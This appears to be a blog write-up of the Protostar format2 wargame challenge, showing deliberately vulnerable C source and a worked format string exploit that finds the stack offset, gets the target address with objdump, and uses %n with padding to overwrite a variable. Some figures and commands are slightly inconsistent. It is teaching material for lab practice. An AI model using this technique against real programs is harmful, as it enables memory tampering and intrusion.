---
layout: post
title: "Protostar format00 error"
tags: [protostar]
comments: false
---

We are given a source code for this challenge.

```
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

int target;

void vuln()
{
  char buffer[512];

  fgets(buffer, sizeof(buffer), stdin);
  printf(buffer);
  
  if(target == 64) {
      printf("you have modified the target :)\n");
  } else {
      printf("target is %d :(\n", target);
  }
}

int main(int argc, char **argv)
{
  vuln();
}
```

if target equals to 64 we win.
and we can see format string vulnerability happenes in printf(buffer)

Let's do what we did for format01 which is giving AAAA and looking for the offset

```
AAAA200.b7fd8420.bffff614.41414141.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.
target is 0 :(
user@protostar:/opt/protostar/bin$ (python -c print' "AAAA"+"%x."*4 ') | ./format2 
AAAA200.b7fd8420.bffff614.41414141.
target is 0 :(
```

We can see that the offset is 4

So if we change AAAA to the target variable address and change the last %x to %n we can write some values in to target

target address
```
user@protostar:/opt/protostar/bin$ objdump -t format2 | grep target
080496e4 g     O .bss   00000004              target

```

switch 
```
user@protostar:/opt/protostar/bin$ (python -c print' "\xe4\x96\x04\x08"+"%x"*3+"%n" ') | ./format2
�200b7fd8420bffff614
target is 23 :(

```

We can see that target only contains a value of 23. This happened because %n put the number of characters that were written to target so what we can do is increasing the number of characters by changing its padding size which can be like

```
%10x
```

Since 64-23 = 41 by doing some simple math we can do 

```
user@protostar:/opt/protostar/bin$ (python -c 'print "\xe4\x96\x04\x08"+"%44x"+"%x"*2+"%n"') | ./format2
�                                         200b7fd8420bffff614
you have modified the target :)
```